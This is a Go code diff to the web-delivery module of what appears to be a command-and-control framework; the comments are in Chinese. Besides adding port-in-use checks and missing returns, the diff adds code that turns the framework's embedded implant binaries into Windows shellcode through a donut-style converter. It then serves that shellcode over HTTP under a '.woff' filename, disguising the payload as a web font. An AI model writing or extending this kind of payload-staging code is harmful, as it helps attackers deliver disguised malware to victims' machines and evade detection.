@@ -3,6 +3,7 @@ package api
 import (
 	"BackendTemplate/pkg/database"
 	"BackendTemplate/pkg/encrypt"
+	"BackendTemplate/pkg/godonut"
 	"bytes"
 	"fmt"
 	"github.com/gin-gonic/gin"
@@ -32,6 +33,20 @@ func StartWebDelivery(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err})
 		return
 	}
+	var w database.WebDelivery
+	if exist, _ := database.Engine.Where("listening_port = ?", web.Port).Exist(&w); exist {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + "端口已被配置"})
+		return
+	}
+
+	inUse, err := isPortInUse(web.Port)
+	if err != nil {
+		fmt.Printf("检测端口 %s 时发生错误: %v\n", web.Port, err)
+	}
+	if inUse {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + "端口被占用"})
+		return
+	}
 
 	osType := web.OS
 	archType := web.Arch
@@ -44,11 +59,13 @@ func StartWebDelivery(c *gin.Context) {
 	binaryFileName := findBinary(listenerType, osType, archType)
 	if binaryFileName == "" {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "未找到匹配的服务端文件"})
+		return
 	}
 	// 从嵌入的文件系统中读取对应文件内容
 	binaryData, err := embeddedFiles.ReadFile("server/" + listenerType + "/" + binaryFileName)
 	if err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": "读取文件失败"})
+		return
 	}
 	var modifiedData []byte
 	if listenerType == "oss" {
@@ -93,6 +110,23 @@ func StartWebDelivery(c *gin.Context) {
 		// 写入字节码到响应体
 		w.Write(modifiedData)
 	})
+
+	if web.OS == "windows" {
+		shellcode, err := godonut.GenShellcode(modifiedData, web.Pass, web.Arch)
+		if err != nil {
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "shellcode生成失败"})
+			return
+		}
+		mux.HandleFunc("/"+web.Filename+".woff", func(w http.ResponseWriter, r *http.Request) {
+			// 设置响应头，指定内容类型为二进制流
+			w.Header().Set("Content-Type", "application/octet-stream")
+			// 设置响应头，指定下载文件的名称
+			w.Header().Set("Content-Disposition", "attachment; filename="+web.Filename+".woff")
+			// 写入字节码到响应体
+			w.Write(shellcode)
+		})
+
+	}
 	tmp := strings.Split(connectAddress, ":")
 	database.Engine.Insert(&database.WebDelivery{
 		ListenerConfig: web.Listener,
@@ -150,6 +184,14 @@ func OpenWebDelivery(c *gin.Context) {
 	}
 	if err := c.ShouldBindJSON(&web); err != nil {
 		c.JSON(http.StatusOK, gin.H{"status": http.StatusBadRequest, "data": err})
+	}
+	inUse, err := isPortInUse(web.Port)
+	if err != nil {
+		fmt.Printf("检测端口 %s 时发生错误: %v\n", web.Port, err)
+	}
+	if inUse {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": web.Port + "端口被占用"})
+		return
 	}
 	var webdelivery database.WebDelivery
 	database.Engine.Where("listening_port = ?", web.Port).Get(&webdelivery)
@@ -215,6 +257,22 @@ func OpenWebDelivery(c *gin.Context) {
 		// 写入字节码到响应体
 		w.Write(modifiedData)
 	})
+	var wd database.WebDelivery
+	database.Engine.Where("listening_port = ?", web.Port).Get(&wd)
+	if wd.OS == "windows" {
+		shellcode, err := godonut.GenShellcode(modifiedData, wd.Pass, wd.Arch)
+		if err != nil {
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "shellcode生成失败"})
+		}
+		mux.HandleFunc("/"+wd.FileName+".woff", func(w http.ResponseWriter, r *http.Request) {
+			// 设置响应头，指定内容类型为二进制流
+			w.Header().Set("Content-Type", "application/octet-stream")
+			// 设置响应头，指定下载文件的名称
+			w.Header().Set("Content-Disposition", "attachment; filename="+wd.FileName+".woff")
+			// 写入字节码到响应体
+			w.Write(shellcode)
+		})
+	}
 
 	database.Engine.Where("listening_port = ?", web.Port).Update(&database.WebDelivery{Status: 1})
 	server := &http.Server{
